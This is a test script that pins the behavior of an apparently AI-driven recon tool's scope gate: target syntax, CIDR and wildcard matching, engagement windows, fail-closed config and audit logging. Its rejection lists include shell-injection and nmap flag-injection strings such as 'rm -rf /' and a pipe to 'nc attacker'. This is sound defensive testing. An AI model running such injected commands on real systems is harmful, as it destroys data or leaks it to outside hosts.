#!/bin/bash
# Characterization tests for the engagement scope gate.
#
# scope.py is the single place that decides whether the agent may touch a
# target. It had no automated tests at all, so every previous change to the
# authorization rules was made blind. These tests pin the current behavior --
# including the parts that are subtle or surprising -- so that a later
# security fix cannot quietly alter an unrelated rule.
#
# The property that matters most, and is asserted repeatedly below, is
# fail-closed: any malformed, missing, or unparseable configuration must
# refuse every target, never allow one.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export PYTHONPATH="$ROOT/mcp-servers/shinobi-recon${PYTHONPATH:+:$PYTHONPATH}"

python3 - <<'PY'
import datetime as dt
import json
import os
import shutil
import sys
import tempfile
from contextlib import contextmanager
from pathlib import Path

import yaml

from shinobi_recon import scope
from shinobi_recon.scope import ScopeError, validate_target_syntax

failures = []
checks = 0


def check(condition, message):
    global checks
    checks += 1
    if condition:
        print(f"  ok   {message}")
    else:
        print(f"  FAIL {message}")
        failures.append(message)


def refuses(callable_, message, *, expect_fragment=None):
    try:
        callable_()
    except ScopeError as exc:
        if expect_fragment and expect_fragment not in str(exc):
            check(False, f"{message} (message {str(exc)!r} lacks {expect_fragment!r})")
            return
        check(True, message)
    else:
        check(False, f"{message} (no ScopeError raised)")


def allows(callable_, message):
    try:
        callable_()
    except ScopeError as exc:
        check(False, f"{message} (unexpectedly refused: {exc})")
    else:
        check(True, message)


@contextmanager
def engagement(scope_data, *, name="unit-test"):
    """Materialize an engagement in a temp dir and point the env at it."""
    home = Path(tempfile.mkdtemp(prefix="shinobi-scope-"))
    try:
        if scope_data is not None:
            (home / "scope.yaml").write_text(yaml.safe_dump(scope_data))
        previous = {
            key: os.environ.get(key)
            for key in ("SHINOBI_ENGAGEMENT", "SHINOBI_ENGAGEMENT_DIR", "XDG_DATA_HOME")
        }
        os.environ["SHINOBI_ENGAGEMENT"] = name
        os.environ["SHINOBI_ENGAGEMENT_DIR"] = str(home)
        yield home
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        shutil.rmtree(home, ignore_errors=True)


def window(start_offset, end_offset):
    today = dt.date.today()
    return {
        "start": (today + dt.timedelta(days=start_offset)).isoformat(),
        "end": (today + dt.timedelta(days=end_offset)).isoformat(),
    }


# ---------------------------------------------------------------------------
print("== target syntax validation ==")
# validate_target_syntax is the only thing standing between model-supplied
# text and a subprocess argv, so flag-shaped input must never get through.
for bad in [
    "--script=evil",
    "-sS",
    "-oN",
    "--",
    "example.com; rm -rf /",
    "example.com && id",
    "example.com | nc attacker 1",
    "example.com$(id)",
    "example.com`id`",
    "example.com\nid",
    "exa mple.com",
    "",
    " ",
    ".",
    "..",
    ".example.com",
    "example.com.",
    "-example.com",
    "example-.com",
    "exa_mple.com",
    "example.com:8080",
    "http://example.com",
    "user@example.com",
    "example.com#frag",
    "*.example.com",
    "127.0.0.1/24",
    "a" * 64 + ".com",
]:
    refuses(lambda b=bad: validate_target_syntax(b), f"rejects malformed target {bad!r}")

for good in [
    "example.com",
    "sub.example.com",
    "a.b.c.d.example.com",
    "localhost",
    "xn--bcher-kva.example",
    "EXAMPLE.com",
    "0",
    "::1",
    "127.0.0.1",
    "10.0.0.1",
    "255.255.255.255",
    "::ffff:127.0.0.1",
    "a" * 63 + ".com",
    "xn--bcher-kva.example",
]:
    allows(lambda g=good: validate_target_syntax(g), f"accepts well-formed target {good!r}")

# ---------------------------------------------------------------------------
print("== target matching ==")
m = scope._target_matches

# CIDR entries only ever match IP targets. A hostname entry must not be
# accepted just because it looks like it lives in the network.
for entry, target, expected in [
    ("10.0.0.0/8", "10.1.2.3", True),
    ("10.0.0.0/8", "11.1.2.3", False),
    ("10.0.0.0/24", "10.0.0.255", True),
    ("10.0.0.0/24", "10.0.1.0", False),
    ("10.0.0.5/32", "10.0.0.5", True),
    ("10.0.0.5/32", "10.0.0.6", False),
    ("10.0.0.0/8", "example.com", False),
    ("10.0.0.0/8", "not-an-ip", False),
    ("0.0.0.0/0", "8.8.8.8", True),
    ("::1/128", "::1", True),
    # A malformed CIDR must not become a wildcard match.
    ("10.0.0.0/99", "10.0.0.1", False),
    ("10.0.0.0/abc", "10.0.0.1", False),
    ("garbage/24", "10.0.0.1", False),
    ("", "example.com", False),
]:
    check(m(target, entry) is expected, f"{target!r} vs entry {entry!r} -> {expected}")

for entry, target, expected in [
    ("example.com", "example.com", True),
    ("example.com", "EXAMPLE.COM", True),
    ("example.com", "sub.example.com", False),
    ("example.com", "example.com.evil.net", False),
    ("example.com", "evilexample.com", False),
    ("example.com", "example.co", False),
    # A bare IP entry must not match a hostname spelling of itself.
    ("127.0.0.1", "127.0.0.1", True),
    ("127.0.0.1", "localhost", False),
    ("127.0.0.1", "127.0.0.2", False),
    ("::1", "::1", True),
    ("::1", "0:0:0:0:0:0:0:1", True),
]:
    check(m(target, entry) is expected, f"{target!r} vs entry {entry!r} -> {expected}")

# Wildcard entries. Note the last case: a leading "*." currently matches at
# any depth, so "*.example.com" also authorizes "deep.sub.example.com".
# That is more permissive than a certificate-style wildcard implies, and is
# asserted here so the fix for it is a deliberate, visible change rather than
# an accident.
for entry, target, expected in [
    ("*.example.com", "a.example.com", True),
    ("*.example.com", "A.EXAMPLE.COM", True),
    ("*.example.com", "example.com", False),
    ("*.example.com", "evilexample.com", False),
    ("*.example.com", "a.example.com.evil.net", False),
    ("*.example.com", "deep.sub.example.com", True),
]:
    check(m(target, entry) is expected, f"{target!r} vs wildcard {entry!r} -> {expected}")

# ---------------------------------------------------------------------------
print("== window handling (fail closed) ==")


def window_allows(data, message):
    check(scope._in_window(data) is True, message)


def window_refuses(data, message):
    check(scope._in_window(data) is False, message)


window_refuses({}, "missing window refuses")
window_refuses({"window": {}}, "empty window refuses")
window_refuses({"window": {"start": "CHANGE ME", "end": "CHANGE ME"}}, "placeholder window refuses")
window_refuses({"window": {"start": "not-a-date", "end": "not-a-date"}}, "unparseable window refuses")
window_refuses({"window": {"start": None, "end": None}}, "null window refuses")
window_refuses({"window": {"start": 20200101, "end": 20201231}}, "integer window refuses")
window_refuses({"window": {"start": "2020-01-01", "end": "2020-12-31"}}, "expired window refuses")
window_refuses({"window": {"start": "2999-01-01", "end": "2999-12-31"}}, "future window refuses")
window_refuses({"window": {"start": "2030-06-01", "end": "2030-05-31"}}, "reversed window refuses")
window_refuses({"window": {"end": "2999-12-31"}}, "window with no start refuses")
window_refuses({"window": {"start": "2020-01-01"}}, "window with no end refuses")
window_allows({"window": window(-1, 1)}, "current window allows")
window_allows({"window": window(0, 0)}, "single-day window covering today allows")
window_allows({"window": window(-30, 30)}, "wide window allows")
window_refuses({"window": window(1, 2)}, "window starting tomorrow refuses")
window_refuses({"window": window(-2, -1)}, "window that ended yesterday refuses")

# ---------------------------------------------------------------------------
print("== require_in_scope end to end ==")
valid = {"window": window(-1, 1), "targets": ["10.0.0.0/24", "example.com", "*.corp.example.com"]}

with engagement(valid):
    allows(lambda: scope.require_in_scope("10.0.0.5"), "in-scope IP in CIDR is authorized")
    allows(lambda: scope.require_in_scope("example.com"), "in-scope hostname is authorized")
    allows(lambda: scope.require_in_scope("a.corp.example.com"), "in-scope wildcard host is authorized")
    refuses(
        lambda: scope.require_in_scope("10.0.1.5"),
        "IP outside the CIDR is refused",
        expect_fragment="not in the authorized scope",
    )
    refuses(
        lambda: scope.require_in_scope("evil.net"),
        "out-of-scope hostname is refused",
        expect_fragment="not in the authorized scope",
    )
    refuses(
        lambda: scope.require_in_scope("example.com; id"),
        "shell metacharacters never reach the scope decision",
        expect_fragment="malformed",
    )

# A malformed target must be rejected by the syntax gate *before* the scope
# file is even consulted, so a valid engagement cannot launder it.
with engagement(valid):
    try:
        scope.require_in_scope("--script=/tmp/x")
    except ScopeError as exc:
        check("malformed" in str(exc), "flag injection refused as malformed, not as out-of-scope")
    else:
        check(False, "flag injection refused as malformed, not as out-of-scope")

with engagement({"window": window(-1, 1), "targets": []}):
    refuses(
        lambda: scope.require_in_scope("example.com"),
        "empty target list refuses everything",
        expect_fragment="not in the authorized scope",
    )

with engagement({"targets": ["example.com"]}):
    refuses(
        lambda: scope.require_in_scope("example.com"),
        "missing window refuses even an in-scope target",
        expect_fragment="window",
    )

with engagement({"window": window(-1, 1), "targets": None}):
    refuses(
        lambda: scope.require_in_scope("example.com"),
        "null target list refuses everything",
    )

with engagement(None):
    refuses(
        lambda: scope.require_in_scope("example.com"),
        "missing scope file refuses",
        expect_fragment="No scope file",
    )

# No engagement at all: must refuse, and must say how to fix it.
saved = {k: os.environ.pop(k, None) for k in ("SHINOBI_ENGAGEMENT", "SHINOBI_ENGAGEMENT_DIR")}
try:
    refuses(
        lambda: scope.require_in_scope("example.com"),
        "no active engagement refuses",
        expect_fragment="No active engagement",
    )
    refuses(
        lambda: scope.current_engagement(),
        "current_engagement() raises without env",
    )
finally:
    for key, value in saved.items():
        if value is not None:
            os.environ[key] = value

# A corrupt scope file must fail closed, not crash or allow.
with engagement(None) as home:
    (home / "scope.yaml").write_text("targets: [unclosed\n")
    try:
        scope.require_in_scope("example.com")
    except ScopeError:
        check(True, "corrupt scope file refuses")
    except Exception as exc:  # noqa: BLE001
        check(False, f"corrupt scope file refuses (raised {type(exc).__name__}: {exc})")
    else:
        check(False, "corrupt scope file refuses (no error raised)")

# A scope file that parses to a non-mapping (a list, a bare string) must not
# be treated as an empty-but-valid scope.
for hostile in ["- just a string\n", "- a\n- b\n", "42\n"]:
    with engagement(None) as home:
        (home / "scope.yaml").write_text(hostile)
        try:
            scope.require_in_scope("example.com")
        except ScopeError:
            check(True, f"non-mapping scope {hostile.strip()!r} refuses")
        except Exception as exc:  # noqa: BLE001
            check(False, f"non-mapping scope {hostile.strip()!r} refuses (raised {type(exc).__name__}: {exc})")
        else:
            check(False, f"non-mapping scope {hostile.strip()!r} refuses (allowed!)")

# ---------------------------------------------------------------------------
print("== audit logging ==")
with engagement(valid) as home:
    eng = scope.require_in_scope("example.com")
    scope.log_call(eng, "nmap_scan", "example.com", ["nmap", "-T4"], "allowed", "ok")
    scope.log_call(eng, "nmap_scan", "evil.net", ["nmap", "-T4"], "refused", "not in scope")
    # Detail is attacker-influenced (tool output). It must not be able to
    # break the one-record-per-line contract.
    scope.log_call(eng, "http_headers", "example.com", ["HEAD", "http://example.com/"],
                   "allowed", 'quotes " and backslash \\ and newline\ninjected and emoji 🎯')
    scope.log_call(eng, "nmap_scan", "example.com", ["nmap"], "allowed", "x" * 5000)

    lines = (home / "log.jsonl").read_text().splitlines()
    check(len(lines) == 4, f"one JSON record per call (got {len(lines)})")

    records = []
    for number, line in enumerate(lines, 1):
        try:
            records.append(json.loads(line))
        except json.JSONDecodeError as exc:
            check(False, f"line {number} is valid JSON ({exc})")
    check(len(records) == 4, "every log line parses independently")

    if len(records) == 4:
        first = records[0]
        check(first["tool"] == "nmap_scan", "record keeps the tool name")
        check(first["verdict"] == "allowed", "record keeps the verdict")
        check(first["args"] == ["nmap", "-T4"], "record keeps the argv")
        check("ts" in first and first["ts"].endswith("+00:00"), "record is UTC-stamped")

        check(records[1]["verdict"] == "refused", "refusals are recorded with their own verdict")
        check(records[2]["detail"].count("\n") == 1,
              "a newline in tool output does not split the log record")
        check(len(records[3]["detail"]) == 2000, "detail is truncated to 2000 characters")

# A refusal that happens before an engagement can be resolved has nowhere to
# write, so it must still reach stderr rather than vanish.
import io  # noqa: E402
import contextlib  # noqa: E402

saved = {k: os.environ.pop(k, None) for k in ("SHINOBI_ENGAGEMENT", "SHINOBI_ENGAGEMENT_DIR")}
try:
    stderr = io.StringIO()
    with contextlib.redirect_stderr(stderr):
        scope.log_call(None, "nmap_scan", "evil.net", ["nmap"], "refused", "no engagement")
    captured = stderr.getvalue()
    check(
        "shinobi-recon:" in captured,
        "engagement-less refusal reaches stderr, not stdout "
        f"(stderr={captured!r})",
    )
    if "shinobi-recon:" in captured:
        try:
            parsed = json.loads(captured.split("shinobi-recon:", 1)[1])
            check(parsed["verdict"] == "refused", "engagement-less stderr line is valid JSON")
        except json.JSONDecodeError as exc:
            check(False, f"engagement-less stderr line is valid JSON ({exc})")
finally:
    for key, value in saved.items():
        if value is not None:
            os.environ[key] = value

# ---------------------------------------------------------------------------
print(f"\n{checks - len(failures)}/{checks} checks passed")
if failures:
    print(f"scope-gate-test: FAIL ({len(failures)} failed)")
    for item in failures:
        print(f"  - {item}")
    sys.exit(1)

print("scope-gate-test: PASS")
PY
